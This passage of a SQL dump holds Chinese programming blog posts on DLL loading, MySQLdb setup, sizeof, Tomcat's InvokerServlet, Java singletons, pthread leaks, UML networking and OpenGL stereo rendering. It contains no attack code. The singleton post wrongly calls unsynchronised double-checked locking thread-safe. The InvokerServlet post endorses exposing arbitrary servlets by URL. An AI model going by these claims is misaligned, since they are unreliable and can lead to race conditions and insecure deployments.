&nbsp;&nbsp;&nbsp; &nbsp;else&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#detailnext\").html(\'\');&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find(\"#detailedit\").html(\"&lt;a href=../action/editCraftStep.do?ready=false&amp;id=\"+encodeURI(id)+\"&gt;编辑&lt;/a&gt;\");&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return false;&nbsp;&nbsp; &nbsp;});&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;});','',0,'\"web skills\"',0,'','zinnia/_entry_detail.html','entry_detail.html'),(326,'VC++动态加载dll','33731937201051910408644',2,'2010-06-19 10:40:08',NULL,'2010-06-19 10:40:08','2014-07-13 18:57:24','Win XP 没有蓝牙协议栈，因此要安装BlueSolei之类的蓝牙工具包，然后就可以用Blue Soleil 提供的 SDK，连接BlueSoleil的dll.<br />但是Win7已经支持蓝牙了，就不需要安装BlueSoleil了，程序也就找不到blue Soleil的dll了。<br />如何解决程序在Win XP和Win7上的差异呢<br />一是使用宏，在WinXP上编译时，编译上BlueSolei相关的代码，在Win7上编译时，不编译BlueSoleil相关的代码。<br />但是没有找到判断操作系统是WinXP还是Win7这样的宏<br />二是使用动态加载dll的方法<br />HINSTANCE&nbsp; btLib = LoadLibrary(TEXT(\"btfunc.dll\"));&nbsp; //获取dll句柄<br />typedef BOOL (__cdecl *BTLibInit)(void);&nbsp; //定义函数原型<br />BTLibInit btInit = (BTLibInit)GetProcAddress(btLib, \"BT_InitializeLibrary\"); //获取函数入口<br />if(!(btInit)()){ //调用函数<br />}<br />函数原型和函数入口名可以从SDK提供的头文件中获得。或者先用传统的方式加载，然后再必定成这种动态加载的方式。<br />例如上例是从BOOL BT_InitializeLibrary(void) 改写成的',1,1,1,0,0,0,'Win XP 没有蓝牙协议栈，因此要安装BlueSolei之类的蓝牙工具包，然后就可以用Blue Soleil 提供的 SDK，连接BlueSoleil的dll.但是Win7已经支持蓝牙了，就不需要安装BlueSoleil了，程序也就找不到blue Soleil的dll了。如何解决程序在Win XP和Win7上的差异呢一是使用宏，在WinXP上编译时，编译上BlueSolei相关的代码，在Win7上编译时，不编译BlueSoleil相关的代码。但是没有找到判断操作系统是WinXP还是Win7这样的宏二是使用动态加载dll的方法HINSTANCE&nbsp; btLib = LoadLibrary(TEXT(\"btfunc.dll\"));&nbsp; //获取dll句柄typedef BOOL (__cdecl *BTLibInit)(void);&nbsp; //定义函数原型BTLibInit btInit = (BTLibInit)GetProcAddress(btLib, \"BT_InitializeLibrary\"); //获取函数入口if(!(btInit)()){ //调用函数}函数原型和函数入口名可以从SDK提供的头文件中获得。或者先用传统的方式加载，然后再必定成这种动态加载的方式。例如上例是从BOOL BT_InitializeLibrary(void) 改写成的','',0,'cc',0,'','zinnia/_entry_detail.html','entry_detail.html'),(327,'windows(win7)python2.6安装python-MySQLdb','33731937201052502031934',2,'2010-06-25 12:20:31',NULL,'2010-06-25 12:20:31','2014-07-13 18:57:24','首先下载mysql安装文件，官网上下载太麻烦了，直接去天空软件站下载：<br />http://www.skycn.com/soft/1262.html<br />注意安装的时候选择Custom选项，然后把C Include Files/Lib Files选中，因为后面build时需要<br />然后下载MySQLdb<br />http://sourceforge.net/projects/mysql-python/files/<br />解压缩到一个文件夹中，然后开始安装<br />首先安装 easy_install<br />python ez_install.py<br />然后build MySQLdb<br />python setup.py build<br />出现错误1:<br />serverKey = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, options[\'registry_key\']) WindowsError: [Error 2]<br />解决方法：<br />打开MySQL-python-1.2.3/site.cfg文件，将最后一行的5.0修改为5.1，如下所示:<br />registry_key = SOFTWARE\\MySQL AB\\MySQL Server 5.1<br /><br />重新python setup.py build<br />出现错误2:<br />build\\temp.win32-2.6\\Release\\_mysql.pyd.manifest : general error c1010070: Failed to load and parse the manifest. The system cannot find&nbsp; the file specified.<br />error: command ‘mt.exe’ failed with exit status 31<br />解决方法：<br />打开 C:\\Python26\\Lib\\distutils\\msvc9compiler.py<br />找到这一行 ld_args.append(‘/MANIFESTFILE:’ + temp_manifest)<br />然后在下面加入一行 ld_args.append(‘/MANIFEST’)<br /><br />重新python setup.py build成功<br />最后执行<br />python setup.py install<br />成功<br /><br />googlecode 上有别人编译好的exe程序，也许能用',1,1,1,0,0,0,'首先下载mysql安装文件，官网上下载太麻烦了，直接去天空软件站下载：http://www.skycn.com/soft/1262.html注意安装的时候选择Custom选项，然后把C Include Files/Lib Files选中，因为后面build时需要然后下载MySQLdbhttp://sourceforge.net/projects/mysql-python/files/解压缩到一个文件夹中，然后开始安装首先安装 easy_installpython ez_install.py然后build MySQLdbpython setup.py build出现错误1:serverKey = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, options[\'registry_key\']) WindowsError: [Error 2]解决方法：打开MySQL-python-1.2.3/site.cfg文件，将最后一行的5.0修改为5.1，如下所示:registry_key = SOFTWARE\\MySQL AB\\MySQL Server 5.1重新python setup.py build出现错误2:build\\temp.win32-2.6\\Release\\_mysql.pyd.manifest : general error c1010070: Failed to load and parse the manifest. The system cannot find&nbsp; the file specified.error: command ‘mt.exe’ failed with exit status 31解决方法：打开 C:\\Python26\\Lib\\distutils\\msvc9compiler.py找到这一行 ld_args.append(‘/MANIFESTFILE:’ + temp_manifest)然后在下面加入一行 ld_args.append(‘/MANIFEST’)重新python setup.py build成功最后执行python setup.py install成功googlecode 上有别人编译好的exe程序，也许能用','',0,'database',0,'','zinnia/_entry_detail.html','entry_detail.html'),(328,'C++中的sizeof关键字','337319372010316114719699',2,'2010-04-16 11:47:19',NULL,'2010-04-16 11:47:19','2014-07-13 18:57:25','void fun(short h[100]){<br />&nbsp;&nbsp; &nbsp;int i = sizeof(h);//4 pointer<br />}<br />int main(){<br />&nbsp;&nbsp; &nbsp;int *p = 0;<br />&nbsp;&nbsp; &nbsp;int size = sizeof(p);//4 pointer<br />&nbsp;&nbsp; &nbsp;size = sizeof(*p);//4 int<br />&nbsp;&nbsp; &nbsp;short a[100];<br />&nbsp;&nbsp; &nbsp;size = sizeof(a);//200 2*100<br />&nbsp;&nbsp; &nbsp;size = sizeof(a[100]);//2 int<br />&nbsp;&nbsp; &nbsp;size = sizeof(&amp;a);//4 pointer<br />&nbsp;&nbsp; &nbsp;size = sizeof(&amp;a[0]);//4 pointer<br />&nbsp;&nbsp; &nbsp;short h[100];<br />&nbsp;&nbsp; &nbsp;fun(h);<br />&nbsp;&nbsp; &nbsp;return 0;<br />}',1,1,1,0,0,0,'void fun(short h[100]){&nbsp;&nbsp; &nbsp;int i = sizeof(h);//4 pointer}int main(){&nbsp;&nbsp; &nbsp;int *p = 0;&nbsp;&nbsp; &nbsp;int size = sizeof(p);//4 pointer&nbsp;&nbsp; &nbsp;size = sizeof(*p);//4 int&nbsp;&nbsp; &nbsp;short a[100];&nbsp;&nbsp; &nbsp;size = sizeof(a);//200 2*100&nbsp;&nbsp; &nbsp;size = sizeof(a[100]);//2 int&nbsp;&nbsp; &nbsp;size = sizeof(&amp;a);//4 pointer&nbsp;&nbsp; &nbsp;size = sizeof(&amp;a[0]);//4 pointer&nbsp;&nbsp; &nbsp;short h[100];&nbsp;&nbsp; &nbsp;fun(h);&nbsp;&nbsp; &nbsp;return 0;}','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(329,'Tomcat不用配置web.xml执行Servlet-InvokeServlet','3373193720078642922241',2,'2007-09-06 16:29:22',NULL,'2007-09-06 16:29:22','2014-07-13 18:57:25','<p>在web.xml里加入如下一段</p>\n<p>&nbsp;&lt;servlet&gt;<br />&nbsp;&nbsp;&lt;servlet-name&gt;invoker&lt;/servlet-name&gt;<br />&nbsp;&nbsp;&lt;servlet-class&gt;org.apache.catalina.servlets.InvokerServlet&lt;/servlet-class&gt;<br />&nbsp;&lt;/servlet&gt;<br />&nbsp;&lt;servlet-mapping&gt;<br />&nbsp;&nbsp;&lt;servlet-name&gt;invoker&lt;/servlet-name&gt;<br />&nbsp;&nbsp;&lt;url-pattern&gt;/servlet/*&lt;/url-pattern&gt;<br />&nbsp;&lt;/servlet-mapping&gt;</p>\n<p>然后就可以直接用/servlet/cn.ssdut.TestServlet来直接访问cn.ssdut.TestServlet这个Servlet了。不用在xml中一个一个的配置Servlet了，在某些需要高度灵活性的场合可以使用。</p>\n<p>个人比较喜欢这种机制，因为它的灵活性很好，可以在不修改原网站任何部署的情况下增加新功能，结合数据库，就可以实现用数据库来配置网站部署的功能。</p>',1,1,1,0,0,0,'在web.xml里加入如下一段\n&nbsp;&lt;servlet&gt;&nbsp;&nbsp;&lt;servlet-name&gt;invoker&lt;/servlet-name&gt;&nbsp;&nbsp;&lt;servlet-class&gt;org.apache.catalina.servlets.InvokerServlet&lt;/servlet-class&gt;&nbsp;&lt;/servlet&gt;&nbsp;&lt;servlet-mapping&gt;&nbsp;&nbsp;&lt;servlet-name&gt;invoker&lt;/servlet-name&gt;&nbsp;&nbsp;&lt;url-pattern&gt;/servlet/*&lt;/url-pattern&gt;&nbsp;&lt;/servlet-mapping&gt;\n然后就可以直接用/servlet/cn.ssdut.TestServlet来直接访问cn.ssdut.TestServlet这个Servlet了。不用在xml中一个一个的配置Servlet了，在某些需要高度灵活性的场合可以使用。\n个人比较喜欢这种机制，因为它的灵活性很好，可以在不修改原网站任何部署的情况下增加新功能，结合数据库，就可以实现用数据库来配置网站部署的功能。','',0,'j2ee',0,'','zinnia/_entry_detail.html','entry_detail.html'),(330,'Singleton的几种实现','33731937201042895045549',2,'2010-05-28 09:50:45',NULL,'2010-05-28 09:50:45','2014-07-13 18:57:25','1.非延时加载（全局变量法）<br />private static Singleton instance = new Singleton();<br />public\n static Singleton getInstance(){<br />&nbsp; return instance;<br />}<br />问题：可能程序中根\n本不需要实例化Singleton，这样做就会带来创建Singleton的额外开销<br />\n非延时加载类似全局变量，而单例模式比全局变量的优势就是：延时加载！<br /><br />2.最简单（线程不安全）<br />private Singleton(){}<br />private static Singleton instance = null;<br />public static Singleton getInstance(){<br />&nbsp; if(instance == null){//1.<br />&nbsp;&nbsp;&nbsp; instance = new Singleton();//2.<br />&nbsp; }<br />&nbsp; return instance;<br />}<br />问题：线程不安全，可能有两个线程同时运行到1，则同时检测到instance为null，从而创建了两个实例。<br /><br />3. 同步+双重锁（线程安全）<br />public static Singleton getInstance(){<br />&nbsp; if(instance == null){&nbsp; //1.<br />&nbsp;&nbsp;&nbsp; synchronized(Singleton.class){ //2<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(instance == null) //3<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; instance = new Singleton();<br />&nbsp;&nbsp;&nbsp; }<br />&nbsp; }<br />&nbsp; return instance;<br />}<br />说明：<br />如果将synchronized加在1的位置，就很容易影响程序的性能，因此1是经常要执行的语句<br />因为synchronized关键字没加在1的位置，因此可能有两个线程同时到达2，并依次到达3，因此要在3进行第二次检查double check',1,1,1,0,0,0,'1.非延时加载（全局变量法）private static Singleton instance = new Singleton();public\n static Singleton getInstance(){&nbsp; return instance;}问题：可能程序中根\n本不需要实例化Singleton，这样做就会带来创建Singleton的额外开销\n非延时加载类似全局变量，而单例模式比全局变量的优势就是：延时加载！2.最简单（线程不安全）private Singleton(){}private static Singleton instance = null;public static Singleton getInstance(){&nbsp; if(instance == null){//1.&nbsp;&nbsp;&nbsp; instance = new Singleton();//2.&nbsp; }&nbsp; return instance;}问题：线程不安全，可能有两个线程同时运行到1，则同时检测到instance为null，从而创建了两个实例。3. 同步+双重锁（线程安全）public static Singleton getInstance(){&nbsp; if(instance == null){&nbsp; //1.&nbsp;&nbsp;&nbsp; synchronized(Singleton.class){ //2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(instance == null) //3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; instance = new Singleton();&nbsp;&nbsp;&nbsp; }&nbsp; }&nbsp; return instance;}说明：如果将synchronized加在1的位置，就很容易影响程序的性能，因此1是经常要执行的语句因为synchronized关键字没加在1的位置，因此可能有两个线程同时到达2，并依次到达3，因此要在3进行第二次检查double check','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(331,'pthread的内存泄露','33731937201072675024100',2,'2010-08-26 19:55:05',NULL,'2010-08-26 19:55:05','2014-07-13 18:57:25','10116<br /># cc thread.c -lpthread<br /># ./a.out<br />1 threads created<br />101 threads created<br />201 threads created<br />301 threads created<br />ERROR, rc is 11, so far 382 threads created<br />Fail:: Resource temporarily unavailable<br />错误提示资源不足，其实是发生了内存泄露，在run函数中，使用pthread_exit退出的线程，并没有像预想的一样释放内存，而是进入僵死状态，只有进程退出的时候才能释放，要想让pthread_exit的线程及时退出，只要在pthread_create后加上pthread_join函数调用即可。只要有了pthread_join，即使没有调用pthread_exit，线程退出时也会释放内存。<br />也就是说pthread_exit只是线程的一个出口，和资源的释放无关，pthread_join直接决定资源是否能够及时释放。<br /><br />#include&lt;pthread.h&gt;<br />void run() {<br />&nbsp;&nbsp;&nbsp; pthread_exit(0);<br />}<br /><br />int main () {<br />&nbsp;&nbsp;&nbsp; pthread_t thread;<br />&nbsp;&nbsp;&nbsp; int rc;<br />&nbsp;&nbsp;&nbsp; long count = 0;<br />&nbsp;&nbsp;&nbsp; while(1) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(rc = pthread_create(&amp;thread, 0, run, 0) ) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(\"ERROR, rc is %d, %ld threads created\\n\", rc, count);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror(\"Fail:\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br /><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //pthread_join(thread,0);</b><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(count++%100==0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(\"%ld threads created\\n\", count);<br />&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; return 0;<br />}',1,1,1,0,0,0,'10116# cc thread.c -lpthread# ./a.out1 threads created101 threads created201 threads created301 threads createdERROR, rc is 11, so far 382 threads createdFail:: Resource temporarily unavailable错误提示资源不足，其实是发生了内存泄露，在run函数中，使用pthread_exit退出的线程，并没有像预想的一样释放内存，而是进入僵死状态，只有进程退出的时候才能释放，要想让pthread_exit的线程及时退出，只要在pthread_create后加上pthread_join函数调用即可。只要有了pthread_join，即使没有调用pthread_exit，线程退出时也会释放内存。也就是说pthread_exit只是线程的一个出口，和资源的释放无关，pthread_join直接决定资源是否能够及时释放。#include&lt;pthread.h&gt;void run() {&nbsp;&nbsp;&nbsp; pthread_exit(0);}int main () {&nbsp;&nbsp;&nbsp; pthread_t thread;&nbsp;&nbsp;&nbsp; int rc;&nbsp;&nbsp;&nbsp; long count = 0;&nbsp;&nbsp;&nbsp; while(1) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(rc = pthread_create(&amp;thread, 0, run, 0) ) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(\"ERROR, rc is %d, %ld threads created\\n\", rc, count);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror(\"Fail:\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //pthread_join(thread,0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(count++%100==0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(\"%ld threads created\\n\", count);&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; return 0;}','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(332,'UML三种网络连接方式','3373193720100632923985',2,'2010-01-06 15:29:23',NULL,'2010-01-06 15:29:23','2014-07-13 18:57:25','slirp, tuntap, uml_switch<br />1. slirp<br />#首先在主机上安装slirp <br />sudo apt-get install slirp<br />#启动UML时使用参数eth0=slirp<br />sudo linux ubd0=hjzfs eth0=slirp umid=hjz<br />#启动后设置网络参数,slir方式的ip是固定的10.0.2.15<br />hankjin@jnfdaj:~$ sudo ifconfig eth0 10.0.2.15<br />hankjin@jnfdaj:~$ sudo route add default dev eth0<br />hankjin@jnfdaj:~$ ping www.sina.com<br />hankjin@jnfdaj:~$ wget www.sina.com<br />#SLIRP只支持TCP和UDP，不支持ICMP，所以ping失败<br /><br />2. tuntap<br />#将用户加入uml-net组<br />sudo adduser username uml-net<br />#查看本地IP 192.168.1.3<br />ifconfig<br />#找出两个空闲IP，例如192.168.1.4和192.168.1.5<br />将其中一个空闲IP作为tap，另一个作为UML的IP<br />linux ubd0=hjzfs eth0=tuntap,,,192.168.1.4 umid=hjz2<br />进行UML后<br />ifconfig eth0 192.168.1.5 up<br />如果出错，使用dmesg 查看log<br /><br />3. uml_switch<br />#首先建立tap和switch，并设置tap的ip，不要和eth0的相同，否则会很麻烦<br />sudo uml_switch -tap tap0 -unix /tmp/umlswitch0 &amp;<br />sudo ifconfig tap0 192.168.1.1 netmask 255.255.255.0<br />#走去UML时使用的参数eth0=daemon,,unix,/tmp/umlswitch0<br />sudo linux ubd0=hjzfs eth0=daemon,,unix,/tmp/umlswitch0<br />#启动后设置网络参数<br />sudo ifconfig eth0 192.168.1.2 netmask 255.255.255.0<br />然后可以用NAT使虚拟交换机的局域网上网<br />',1,1,1,0,0,0,'slirp, tuntap, uml_switch1. slirp#首先在主机上安装slirp sudo apt-get install slirp#启动UML时使用参数eth0=slirpsudo linux ubd0=hjzfs eth0=slirp umid=hjz#启动后设置网络参数,slir方式的ip是固定的10.0.2.15hankjin@jnfdaj:~$ sudo ifconfig eth0 10.0.2.15hankjin@jnfdaj:~$ sudo route add default dev eth0hankjin@jnfdaj:~$ ping www.sina.comhankjin@jnfdaj:~$ wget www.sina.com#SLIRP只支持TCP和UDP，不支持ICMP，所以ping失败2. tuntap#将用户加入uml-net组sudo adduser username uml-net#查看本地IP 192.168.1.3ifconfig#找出两个空闲IP，例如192.168.1.4和192.168.1.5将其中一个空闲IP作为tap，另一个作为UML的IPlinux ubd0=hjzfs eth0=tuntap,,,192.168.1.4 umid=hjz2进行UML后ifconfig eth0 192.168.1.5 up如果出错，使用dmesg 查看log3. uml_switch#首先建立tap和switch，并设置tap的ip，不要和eth0的相同，否则会很麻烦sudo uml_switch -tap tap0 -unix /tmp/umlswitch0 &amp;sudo ifconfig tap0 192.168.1.1 netmask 255.255.255.0#走去UML时使用的参数eth0=daemon,,unix,/tmp/umlswitch0sudo linux ubd0=hjzfs eth0=daemon,,unix,/tmp/umlswitch0#启动后设置网络参数sudo ifconfig eth0 192.168.1.2 netmask 255.255.255.0然后可以用NAT使虚拟交换机的局域网上网','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(333,'用OpenGL作红蓝3D','33731937201052010319858',2,'2010-06-20 22:03:19',NULL,'2010-06-20 22:03:19','2014-07-13 18:57:25','理论上比较简单<br />1. 生成左眼图片<br />2. 生成右眼图片<br />3. 合成两张图片<br />具体步骤如下：<br />1.将模型右移若干距离<br />2. 绑定FBO1，将图像画到fboLeft上<br />3. 将模型左移若干距离<br />4. 绑定FBO2，将图像画到fboRight上<br />5. 绑定FBO3，将fboLeft和fboRight作为纹理进行渲染<br />6. fboLeft 的纹理位置右移，fboRight 的纹理位置左移，<br />7. 然后取fboLeft颜色的R值，与fboRight的G值与B值<br />8. 将FBO3的作为纹理，绘制到屏幕上。<br />主要代码如下：<br /><br />cg代码：lr2final.cg<br />void main_v(<br />&nbsp;&nbsp;&nbsp; in float2 pos : POSITION,<br />&nbsp;&nbsp;&nbsp; out float4 oPos : POSITION,<br />&nbsp;&nbsp;&nbsp; out float4 coord: TEXCOORD){<br />&nbsp;&nbsp;&nbsp; oPos = float4(pos, 0, 1);<br />&nbsp;&nbsp;&nbsp; coord =&nbsp;&nbsp; (oPos+float4(1,1,0,0))/2;<br />}<br />void main_f(<br />&nbsp;&nbsp;&nbsp; in float4 pos: POSITION,<br />&nbsp;&nbsp;&nbsp; in float4 coord: TEXCOORD,<br />&nbsp;&nbsp;&nbsp; out float4 color: COLOR,<br />&nbsp;&nbsp;&nbsp; uniform sampler2D texLeft,<br />&nbsp;&nbsp;&nbsp; uniform sampler2D texRight,<br />&nbsp;&nbsp;&nbsp; uniform float off3d){&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; float4 leftPos = float4(coord.x+off3d, coord.yzw);<br />&nbsp;&nbsp;&nbsp; float4 rightPos = float4(coord.x-off3d, coord.yzw);<br />&nbsp;&nbsp;&nbsp; float4 leftColor = tex2D(texLeft, leftPos.xy);<br />&nbsp;&nbsp;&nbsp; float4 rightColor = tex2D(texRight, rightPos.xy);<br />&nbsp;&nbsp;&nbsp; //color = rightColor;<br />&nbsp;&nbsp;&nbsp; color = float4(leftColor.r, rightColor.g, rightColor.b, 1);<br />}<br />C++代码: run3d.cpp<br />#include &lt;GL/glew.h&gt;<br />#include &lt;GL/glut.h&gt;<br />#include &lt;CG/cg.h&gt;<br />#include &lt;CG/cgGL.h&gt;<br />#include &lt;windows.h&gt;<br /><br /><br />#define NULL 0<br />GLuint frameBuffer, renderBuffer, fboLeft, fboRight, fboFinal;<br />CGprofile vertexProfile, fragmentProfile;<br />CGprogram vertexProgram, fragmentProgram;<br /><br />float zoomRate = 0.8;<br />float angle = 40.0;<br />bool rotate3d = false;<br />int width = 500, height = 500;<br />float off3d = 0.5;<br />float dist3d = 6;<br /><br />void display3d(void);<br />void idle3d();<br />void key3d(unsigned char key, int x, int y);<br /><br />void drawLeft();<br />void drawRight();<br />void lr2Final();<br />void screen3d();<br /><br />void gen3dFBO();<br />void init3d(int argc, char** argv);<br />void initCG();<br />void drawCube(float x, float y, float z);<br />void vertex(float x, float y, float z);<br />void setCgTexParam(char* paramName, GLuint tex,const CGprogram &amp;program) {//pass<br />&nbsp;&nbsp;&nbsp; CGparameter param = cgGetNamedParameter(program, paramName); <br />&nbsp;&nbsp;&nbsp; cgGLSetTextureParameter(param, tex); <br />&nbsp;&nbsp;&nbsp; cgGLEnableTextureParameter(param);<br />}<br />void loadCgProgram(char * cgFile, CGcontext &amp;context, <br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; CGprogram &amp;vProgram, CGprogram &amp;fProgram, CGprofile &amp;vProfile, CGprofile &amp;fProfile){<br />&nbsp;&nbsp;&nbsp; vProgram = cgCreateProgramFromFile(context,<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; CG_SOURCE, cgFile,<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vProfile, \"main_v\", 0);<br />&nbsp;&nbsp;&nbsp; fProgram = cgCreateProgramFromFile(context,<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; CG_SOURCE, cgFile,<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fProfile, \"main_f\", 0);<br />&nbsp;&nbsp;&nbsp; if(!cgIsProgram(vProgram) || !cgIsProgram(fProgram))<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oops(\"Create Cg Program Failed\");<br />&nbsp;&nbsp;&nbsp; cgGLLoadProgram(vProgram);<br />&nbsp;&nbsp;&nbsp; cgGLLoadProgram(fProgram);<br />&nbsp;&nbsp;&nbsp; cgGLBindProgram(vProgram);<br />&nbsp;&nbsp;&nbsp; cgGLBindProgram(fProgram);<br />}<br /><br />int main(int argc, char** argv){<br />&nbsp;&nbsp;&nbsp; init3d(argc, argv);<br />&nbsp;&nbsp;&nbsp; glutDisplayFunc(display3d);<br />&nbsp;&nbsp;&nbsp; glutIdleFunc(idle3d);<br />&nbsp;&nbsp;&nbsp; glutKeyboardFunc(key3d);<br />&nbsp;&nbsp;&nbsp; glutMainLoop();<br />&nbsp;&nbsp;&nbsp; return 0;<br />}<br />//显示函数 <br />void display3d(){<br />&nbsp;&nbsp;&nbsp; //启用FBO<br />&nbsp;&nbsp;&nbsp; glBindFramebufferEXT (GL_FRAMEBUFFER_EXT, frameBuffer);<br />&nbsp;&nbsp;&nbsp; glBindRenderbufferEXT(GL_RENDERBUFFER_EXT, renderBuffer);<br /><br />&nbsp;&nbsp;&nbsp; //画左右眼到Buffer中<br />&nbsp;&nbsp;&nbsp; drawLeft();<br />&nbsp;&nbsp;&nbsp; drawRight();<br />&nbsp;&nbsp;&nbsp; //合并左右眼到Buffer中<br />&nbsp;&nbsp;&nbsp; lr2Final();<br />&nbsp;&nbsp;&nbsp; //停用FBO<br />&nbsp;&nbsp;&nbsp; glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, 0);<br />&nbsp;&nbsp;&nbsp; //将Buffer画到屏幕上<br />&nbsp;&nbsp;&nbsp; screen3d();<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; glutSwapBuffers();<br />}<br />void idle3d(){&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; static float lastTime&nbsp;&nbsp; = 0.0f;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // This will hold the time from the last frame<br />&nbsp;&nbsp;&nbsp; float currentTime = GetTickCount() * 0.001f;&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; if(rotate3d &amp;&amp; currentTime-lastTime&gt;0.04 ){<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; angle+=5;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; lastTime = currentTime;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glutPostRedisplay();<br />&nbsp;&nbsp;&nbsp; }<br />}<br />void key3d(unsigned char k, int x, int y)<br />{<br />&nbsp;&nbsp;&nbsp; switch(k){<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; case 27:<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; exit(0);<br /><br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; case \'r\':<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rotate3d = !rotate3d;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br />&nbsp;&nbsp;&nbsp; }<br />}<br />//初始化<br />void init3d(int argc, char** argv){<br />&nbsp;&nbsp;&nbsp; glutInit(&amp;argc, argv);<br />&nbsp;&nbsp;&nbsp; glutInitWindowSize(width,height);<br />&nbsp;&nbsp;&nbsp; glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGBA | GLUT_DEPTH);<br />&nbsp;&nbsp;&nbsp; glutCreateWindow(\"3D\");<br />&nbsp;&nbsp;&nbsp; initCG();<br />&nbsp;&nbsp;&nbsp; gen3dFBO();<br />}<br />void setPos(float offset){<br />&nbsp;&nbsp;&nbsp; //设置坐标<br />&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION); //pass<br />&nbsp;&nbsp;&nbsp; glLoadIdentity();<br />&nbsp;&nbsp;&nbsp; glFrustum(-1,1, -1,1, 3, 9);<br />&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW); <br />&nbsp;&nbsp;&nbsp; glLoadIdentity();&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; glTranslated(-offset, 0, -dist3d);//平移&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; glScalef(zoomRate, zoomRate, zoomRate);<br />&nbsp;&nbsp;&nbsp; glRotatef(angle, 1, 0, 0);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br />}<br />void drawLeft(){<br />&nbsp;&nbsp;&nbsp; setPos(-off3d);<br />&nbsp;&nbsp;&nbsp; glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, GL_COLOR_ATTACHMENT0_EXT, GL_TEXTURE_2D, fboLeft, 0);<br />&nbsp;&nbsp;&nbsp; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT );<br />&nbsp;&nbsp;&nbsp; drawCube(1.0,1.0, 1.0);<br />}<br />void drawRight(){<br />&nbsp;&nbsp;&nbsp; setPos(off3d);<br />&nbsp;&nbsp;&nbsp; 